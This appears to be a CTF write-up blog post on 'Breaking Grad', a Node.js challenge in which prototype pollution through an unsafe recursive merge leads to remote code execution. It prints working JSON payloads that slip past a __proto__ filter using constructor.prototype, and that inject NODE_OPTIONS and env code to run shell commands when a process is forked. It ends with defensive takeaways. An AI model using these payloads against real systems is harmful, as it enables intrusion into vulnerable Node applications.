---
title: Breaking Grad
published: 2026-02-13
description: "Prototype pollution to RCE in a Node.js CTF challenge."
tags: [ctf, machine, researching]
category: CTF
draft: false
---

## Overview

`Breaking Grad` is a Node.js CTF challenge focused on prototype pollution leading to remote code execution (RCE).

The core issue is an unsafe recursive merge in `/api/calculate`, which allows attacker-controlled properties to be written into `constructor.prototype`.

Once polluted, process-level options are abused and execution is triggered through `/debug/version`.

## Vulnerable Surface

- `POST /api/calculate`: accepts JSON and merges it using insecure object merge logic.
- `GET /debug/version`: starts a Node process via `child_process.fork`, which can be influenced by polluted prototype properties.

Even when `__proto__` is blocked by a WAF, the same effect is reachable through:

```json
{
  "constructor": {
    "prototype": {
      "target_property": "value"
    }
  }
}
```

## Exploitation Path

### 1) Pollute prototype with execution controls

Abuse `constructor.prototype` to set:

- `env.x` with JavaScript payload
- `NODE_OPTIONS` as `--require /proc/self/environ`

This causes code in `env.x` to run when the process is forked.

### 2) Enumerate files

Send to `/api/calculate`:

```json
{
  "constructor": {
    "prototype": {
      "env": {
        "x": "console.log(require(\"child_process\").execSync(\"ls\").toString())//"
      },
      "NODE_OPTIONS": "--require /proc/self/environ"
    }
  }
}
```

Then trigger with `GET /debug/version` to list files and find the randomized flag filename.

### 3) Read the flag

Repeat with a second payload:

```json
{
  "constructor": {
    "prototype": {
      "env": {
        "x": "console.log(require(\"child_process\").execSync(\"cat flag_xxxxx\").toString())//"
      },
      "NODE_OPTIONS": "--require /proc/self/environ"
    }
  }
}
```

Trigger `GET /debug/version` again to retrieve the flag output.

## Why This Works

1. **Insecure recursive merge** allows attacker-controlled deep object writes.
2. **Prototype chain abuse** (`constructor.prototype`) affects broad object behavior.
3. **WAF bypass** blocks `__proto__` but not equivalent prototype paths.
4. **Process spawn abuse** with `NODE_OPTIONS` + environment injection leads to RCE.

## Takeaways

- Never merge untrusted JSON into plain objects without strict key allowlists.
- Block prototype-related keys (`__proto__`, `constructor`, `prototype`) explicitly.
- Treat process/environment option surfaces as security boundaries.

---

Writeup source: https://www.notion.so/Breaking-Grad-27abbbc8b725806a8395e795d9332edd?source=copy_link
